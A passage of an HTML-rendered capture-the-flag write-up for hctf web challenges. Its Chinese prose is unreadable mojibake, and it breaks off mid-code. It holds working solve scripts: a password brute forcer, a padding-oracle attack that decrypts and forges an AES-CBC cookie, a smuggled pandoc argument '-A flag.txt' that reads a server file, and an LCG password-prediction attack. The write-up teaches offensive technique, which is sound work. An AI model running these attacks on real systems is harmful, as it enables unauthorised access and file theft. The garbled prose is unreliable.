class="line">undefined1337</span><br></pre></td></tr></table></figure><p>æäº¤<code>undefined1337</code>å¾—åˆ°flagçš„ç¬¬ä¸€éƒ¨åˆ†<code>flag{W0w_1_gu3ss_th1s</code></p><p><strong>Login 2</strong>çš„ä»£ç å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯md5çš„å¼±ç±»å‹æ¯”è¾ƒï¼Œåªè¦æ±‚md5ä¹‹åçš„å€¼å¼€å¤´æ˜¯0eå³å¯ï¼Œæäº¤<code>s878926199a</code>å¾—åˆ°ä¸‹ä¸€éƒ¨åˆ†çš„flag<code>_t0_be_4_pr3tty_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hash(<span class="string">"md5"</span>, $_GET[<span class="string">'passwd'</span>]) == <span class="string">'0e514198428367523082236389979035'</span>)        &#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Login 3</strong>éƒ¨åˆ†ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">passwd = open(<span class="string">"/opt/passwd.txt"</span>).read()</span><br><span class="line">flag = open(<span class="string">"/opt/flag.txt"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    userpw = request.args.get(<span class="string">"passwd"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> userpw == passwd:</span><br><span class="line">        <span class="keyword">return</span> flag, <span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">assert</span>(len(passwd) == <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span>(passwd.isdigit())</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>å…³é”®åœ¨äºä¸€ä¸‹ä¸¤è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(len(passwd) == 3)</span><br><span class="line">assert(passwd.isdigit())</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤è¡Œåˆ¤æ–­äº†ä»<code>/opt/passwd.txt</code>ä¸­è¯»å‡ºçš„å†…å®¹çš„é•¿åº¦æ˜¯å¦æ˜¯3ï¼Œç±»å‹æ˜¯å¦æ˜¯æ•°å­—ã€‚ä¸€èˆ¬æˆ‘ä»¬å¯èƒ½ä¼šå­—èŠ‚è€ƒè™‘<code>100-999</code>,ä½†æ˜¯è¦çŸ¥é“<code>000ã€009</code>è¿™äº›é•¿åº¦ä¹Ÿæ˜¯3ï¼Œä¹Ÿæ˜¯æ•°å­—ç±»å‹ã€‚æ‰€ä»¥å†™çˆ†ç ´è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://login3.uni.hctf.fun/?passwd=%03d"</span> % i</span><br><span class="line">        r = requests.get(url).content</span><br><span class="line">        s = <span class="string">"""&lt;html&gt;&lt;body&gt;&lt;form method="get"&gt;&lt;input type="text" name="passwd" value="password"&gt;&lt;input type="submit" value="login" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;"""</span></span><br><span class="line">        <span class="keyword">if</span>(s != r.decode(<span class="string">'utf-8'</span>)):</span><br><span class="line">                print(i)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆçˆ†ç ´å¾—åˆ°ç»“æœ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros î‚° ~/Desktop î‚° python testlogin.py</span><br><span class="line">7</span><br></pre></td></tr></table></figure><p>æäº¤<code>007</code>å¾—åˆ°æœ€åä¸€éƒ¨åˆ†flag <code>4_d4mn_l0ng_fl4g}</code></p><h1 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h1><p>target:<code>http://converter.uni.hctf.fun/</code></p><p>åˆ†æä¹‹åï¼Œå¯ä»¥çœ‹åˆ°valsçš„é•¿åº¦æ˜¯16çš„å€æ•°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">content=test</span><br><span class="line"></span><br><span class="line">vals=abe356a36f821925d21c83ed298f35136ba2089bcd4961c4af60426f0e392113a74bc8e5dbcc77aa244833318636d73a0e1c9a6072e40b115743d5f0dbbbc7b9</span><br><span class="line"></span><br><span class="line">128ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">content=testtest</span><br><span class="line"></span><br><span class="line">vals=3594a122720368f402eca150c2d85b82634027d10b41145c06a4396987ff1f4b53d9cfc2d3bd4a3f5a73b4c00bfe158e928d52d868a32ff949a456ab2834fe696435316fd2227396112b0d65fb104961</span><br><span class="line"></span><br><span class="line">160ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">content=testtestte</span><br><span class="line"></span><br><span class="line">vals=ea63f05d45c98e48208261d6e2d2a5d336d657d0ca1b5ca41bf0c8bade5f2db59724e76bdfca4bdefaae182cd1246451d9d2f0b79c867eecd90c1c0fd12f65ff74d174b9ff0f6f97bbfc8c3be536f265</span><br><span class="line"></span><br><span class="line">160ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure></p><p>æ¯”å¦‚ä»¥ä¸‹è¿™ç»„æ•°æ®:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content=t</span><br><span class="line"></span><br><span class="line">vals=a7cef9264688e0abc6717d25c3682ff2452e6ab9d98f6d0f7203b5fb2512d4982189f0f4a0748005a19d93166c15f12855ccbeba2bd7fb8c9283c969df631551</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¿®æ”¹valsçš„ç¬¬ä¸€ä½åå‘é€è¯·æ±‚ï¼Œå¾—åˆ°ä¸€ä¸ªé”™è¯¯<code>JSONDecodeError: Expecting value: line 1 column 1 (char 0)</code>ï¼Œä¿®æ”¹æœ€åä¸€ä½å‘é€è¯·æ±‚ï¼Œå¾—åˆ°ä¸€ä¸ª<code>ValueError: Invalid padding bytes.</code>ã€‚ç”±ä»¥ä¸Šä¸¤ç‚¹å¯ä»¥çœ‹å‡ºï¼Œcookieä¸­åŒ…å«<code>AES-CBC-encrypted JSON</code>æ•°æ®ã€‚æ‰€ä»¥åœ¨è¿™ç§åˆ†ç»„åŠ å¯†ä¸­æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°Padding Oracleæ”»å‡»ï¼Œå…³äºè¿™ç§æ”»å‡»å¯ä»¥å‚è€ƒ:</p><p><a href="https://www.jianshu.com/p/ad8bdd87e131" target="_blank" rel="noopener">ã€ŠWebç‹—è¦æ‡‚çš„Padding Oracleæ”»å‡»ã€‹</a></p><p><a href="https://err0rzz.github.io/2017/11/23/Padding-Oracle-%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">ã€ŠPadding_Oracle æ”»å‡»ã€‹</a></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨è„šæœ¬å°†cookieå€¼è¿›è¡Œè§£å¯†:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># you need get padding_oracle from there</span></span><br><span class="line"><span class="comment"># https://github.com/pspaul/padding-oracle</span></span><br><span class="line"><span class="comment"># you need python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> padding_oracle <span class="keyword">import</span> PaddingOracle</span><br><span class="line"><span class="keyword">from</span> optimized_alphabets <span class="keyword">import</span> json_alphabet</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(cipher_hex)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'vals=&#123;&#125;'</span>.format(cipher_hex)&#125;</span><br><span class="line">    r = requests.get(<span class="string">'http://converter.uni.hctf.fun/convert'</span>, headers=headers)</span><br><span class="line">    response = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'Invalid padding bytes.'</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o = PaddingOracle(oracle, max_retries=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'</span></span><br><span class="line">plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet())</span><br><span class="line">print(<span class="string">'Plaintext: &#123;&#125;'</span>.format(plain))</span><br></pre></td></tr></table></figure><p>è§£å¯†åcookieçš„å†…å®¹ä¸º<code>{&quot;f&quot;: &quot;markdown&quot;, &quot;c&quot;: &quot;AAAABBBBCCCCDDDD&quot;, &quot;t&quot;: &quot;html4&quot;}</code>ï¼Œä¸€èˆ¬è¿™ç§æ–‡æ¡£è½¬æ¢ä½¿ç”¨çš„æ˜¯<code>pandoc</code>ï¼Œæ­¤å¤„çš„<code>f</code>æ˜¯æ§åˆ¶è¾“å…¥æ ¼å¼ï¼Œ<code>c</code>æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ï¼Œ<code>t</code>æ˜¯æ§åˆ¶è¾“å‡ºæ ¼å¼ã€‚</p><p>ç”±é¢˜ç›®å¯çŸ¥æˆ‘ä»¬è¦è¯»å–flag.txtä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨pandocçš„<code>-A</code>å‚æ•°ï¼ŒæŠŠflag.txtçš„å†…å®¹åŒ…å«å‡ºæ¥ã€‚</p><blockquote><p>-A FILE, â€“include-after-body=FILE<br>Include contents of FILE, verbatim, at the end of the document body (before the  tag in HTML, or the \end{document} command in LaTeX). This option can be used repeatedly to include multiple files. They will be included in the order specified. Implies â€“standalone.</p></blockquote><p>è¦æ³¨æ„æ­¤å¤„å‰ç«¯å¥½åƒæœ‰ç™½åå•è¿‡æ»¤ï¼Œç›´æ¥ä»£å…¥æˆ‘ä»¬çš„å‚æ•°è¯å¾—ä¸åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚</p><p><a href="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" alt="å±å¹•å¿«ç…§ 2018-11-01 ä¸‹åˆ6.06.45.png"></a></p><p>æ‰€ä»¥æˆ‘åœ¨æŠ“åŒ…ä¹‹åä¿®æ”¹cookieçš„å€¼ã€‚cookieçš„ç”Ÿæˆè„šæœ¬å¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> padding_oracle <span class="keyword">import</span> PaddingOracle</span><br><span class="line"><span class="keyword">from</span> optimized_alphabets <span class="keyword">import</span> json_alphabet</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(cipher_hex)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'vals=&#123;&#125;'</span>.format(cipher_hex)&#125;</span><br><span class="line">    r = requests.get(<span class="string">'http://converter.uni.hctf.fun/convert'</span>, headers=headers)</span><br><span class="line">    response = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'Invalid padding bytes.'</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o = PaddingOracle(oracle, max_retries=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'</span></span><br><span class="line">plain     = <span class="string">b'&#123;"f": "markdown", "c": "AAAABBBBCCCCDDDD", "t": "html4"&#125;'</span></span><br><span class="line">plain_new = <span class="string">b'&#123;"f": "markdown -A flag.txt", "c": "D", "t": "html4"&#125;'</span></span><br><span class="line"></span><br><span class="line">cipher_new = o.craft(cipher, plain, plain_new)</span><br><span class="line">print(<span class="string">'Modified: &#123;&#125;'</span>.format(cipher_new))</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°flag<br><a href="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" alt="å±å¹•å¿«ç…§ 2018-11-01 ä¸‹åˆ6.03.36.png"></a></p><h1 id="LCG-and-the-X"><a href="#LCG-and-the-X" class="headerlink" title="LCG and the X"></a>LCG and the X</h1><p>æ‰“å¼€ä¸»é¡µçœ‹åˆ°å¦‚ä¸‹æè¿°ï¼Œæœ€åä¸€å¥<code>Save secret messages prefixed with &quot;flag{&quot; (which is always handy...)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hello!</span><br><span class="line">This is the website for our on-campus fanclub of the band LCG and the X!</span><br><span class="line">Everyone can signup for the club to:</span><br><span class="line"></span><br><span class="line">   Get the latest LCG news</span><br><span class="line">   Communicate with other fans</span><br><span class="line">   Save secret messages prefixed with &quot;flag&#123;&quot; (which is always handy...)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æˆ‘ä»¬è¿›è¡Œæ³¨å†Œç™»å½•ï¼Œæ³¨å†Œåå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><p><a href="https://i.loli.net/2018/11/02/5bdc0a1864318.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/02/5bdc0a1864318.png" alt="å±å¹•å¿«ç…§ 2018-11-02 ä¸‹åˆ4.25.25.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User Number: 34 </span><br><span class="line">Password: 4391179335210642486020975422279755323</span><br></pre></td></tr></table></figure><p>bitmapå›¾ç‰‡çš„åœ°å€ä¸º<code>http://lcgandthex.uni.hctf.fun/static/pics/34.bmp</code>ï¼Œbitmapå›¾ç‰‡åç§°å‰é¢çš„åºå·å’Œæˆ‘ä»¬ç”¨æˆ·åçš„ç›¸åŒï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æ›´æ”¹å›¾ç‰‡å‰é¢çš„åºå·è¿˜å¯ä»¥ä¸‹è½½å…¶ä»–çš„bitmapå›¾ç‰‡ã€‚è€Œè¿™ä¸ªbitmapå›¾ç‰‡è¿˜æ˜¯ä½œä¸ºpassword recovery tokenæ¥ä½¿ç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å®ƒæ¥é‡ç½®åˆ«çš„è´¦æˆ·çš„å¯†ç ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¿›è¡Œç™»å½•ï¼Œç™»é™†åå¯ä»¥çœ‹åˆ°è¿™æ ·çš„ä¿¡æ¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">News</span><br><span class="line">Website Launch</span><br><span class="line">I just took the website online. I wrote it myself! </span><br><span class="line">I also just signed up to make sure the signup process works.</span><br><span class="line">Then I created a secret flag, which worked as well!</span><br><span class="line">Flag Storage Maintenance</span><br><span class="line">Because of the new data protection laws in europe I decided to temporarily disable the secret flag storage... I hope i can bring it back up soon...</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯¹äºæˆ‘ä»¬è¿™ä¸ªè´¦æˆ·è€Œè¨€ï¼Œå¯†ç æ˜¯è¢«éšè—çš„ï¼Œå› æ­¤å¯èƒ½æˆ‘ä»¬éœ€è¦ç™»å½•ç®¡ç†å‘˜çš„è´¦æˆ·è¿›è¡ŒæŸ¥çœ‹ï¼Ÿé‚£ä¹ˆç®¡ç†å‘˜æœ‰å¯èƒ½æ˜¯åºå·ä¸º1çš„é‚£ä¸€ä¸ªï¼Ÿé‚£ä¹ˆæˆ‘ä»¬å°±è¦è€ƒè™‘æ€ä¹ˆå»è·å–1å·çš„å¯†ç äº†ã€‚å› ä¸ºè¿™é‡Œçš„password recovery tokenæ²¡æœ‰åœ°æ–¹å»è®©æˆ‘ä»¬ä½¿ç”¨ï¼Œæ¯”èµ›ç»“æŸåä¹Ÿæœ‰çœ‹åˆ«çš„æˆ˜é˜Ÿæ˜¯ä½¿ç”¨å¦‚ä¸‹è„šæœ¬åˆ†æäº†bitmapå›¾ç‰‡ç„¶åå¾—åˆ°ä¸€äº›ä¿¡æ¯ä¹‹åè¿›è¡ŒLCGç ´è§£çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> imageio</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Usage: %s file.bmp"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">image = imageio.imread(filename)</span><br><span class="line">out = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> image:</span><br><span class="line">    tmp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(line)):</span><br><span class="line">        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">        tmp |= <span class="number">1</span> <span class="keyword">if</span> line[x] == <span class="number">255</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    print(<span class="string">"% 40d"</span> % tmp)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">å¯¹æ¯”ä¸¤ä¸ªç”¨æˆ·bitmapå›¾ç‰‡ä¸­çš„ä¿¡æ¯å¯ä»¥å‘ä¸‹ç°ä¸¤è€…ç›¸å·® 313373133731337313373133731337</span><br><span class="line"></span><br><span class="line">è¿™é‡Œåªæˆªå–å‰äº”è¡Œ</span><br><span class="line"></span><br><span class="line">34.bmp</span><br><span class="line">        10778143335877814333587781433348</span><br><span class="line">   8024293302815125776712035454147967229</span><br><span class="line">   8424888415969153255243735974754402615</span><br><span class="line">   3343897317520929957383430099400071436</span><br><span class="line">  12356584033995394658660863293223597252</span><br><span class="line">  </span><br><span class="line">35.bmp</span><br><span class="line">        11091516469609151646960915164685</span><br><span class="line">   9972138259316515878515303887207190382</span><br><span class="line">   7570417892854896822411051461517328212</span><br><span class="line">  16016475982551891670926030402121628733</span><br><span class="line">   9296242651229076123142121777120916609</span><br></pre></td></tr></table></figure><p>ä¹‹åå†æ¨ç®—å‡ºä¸€ä¸‹å€¼ä¹‹åè¿›è¡Œçš„æ”»å‡»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = 16285270385112413720426683811263350667</span><br><span class="line">a = 313373133731337313373133731337</span><br><span class="line">c = 123456789012345678901234567890</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œä¸è¿™ä¹ˆå¹²ï¼Œå¯†ç æ˜¯LCGç”Ÿæˆçš„(å› ä¸ºé¢˜ç›®æœ¬èº«å°±æç¤ºäº†LCGè¿™ä¸ªç®—æ³•)ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå°±å±äºä¸æ¸…æ¥ša\c\mçš„å€¼å¯¹LCGç”Ÿæˆå™¨è¿›è¡Œæ”»å‡»ï¼Œé‚£ä¹ˆè¿ç»­æ³¨å†Œå‡ ä¸ªè´¦å·ï¼Œé‡‡é›†ä¸€ä¸‹å¯†ç è¾“å…¥ä¸€ä¸‹è„šæœ¬å°±å¥½äº†ã€‚ç€è¿™é‡Œä½¿ç”¨burpå¤šé‡æ”¾å‡ æ¬¡æ•°æ®åŒ…å°±å¯ä»¥äº†ï¼Œä¸ç”¨æ¬¡éƒ½å»è¾“ä¿¡æ¯æ³¨å†Œã€‚</p><p><a href="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" alt="å±å¹•å¿«ç…§ 2018-11-02 ä¸‹åˆ5.24.28.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">User Number: 34 </span><br><span class="line">Password: 4391179335210642486020975422279755323 </span><br><span class="line"></span><br><span class="line">User Number: 35 </span><br><span class="line">Password: 10752978387235368639990800431243402580 </span><br><span class="line"></span><br><span class="line">User Number: 36 </span><br><span class="line">Password: 829507054147681073533941628943699170 </span><br><span class="line"></span><br><span class="line">User Number: 37 </span><br><span class="line">Password: 7191306106172407227503766637907346427 </span><br><span class="line"></span><br><span class="line">User Number: 38 </span><br><span class="line">Password: 13553105158197133381473591646870993684</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">reduce = functools.reduce</span><br><span class="line">gcd = math.gcd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span 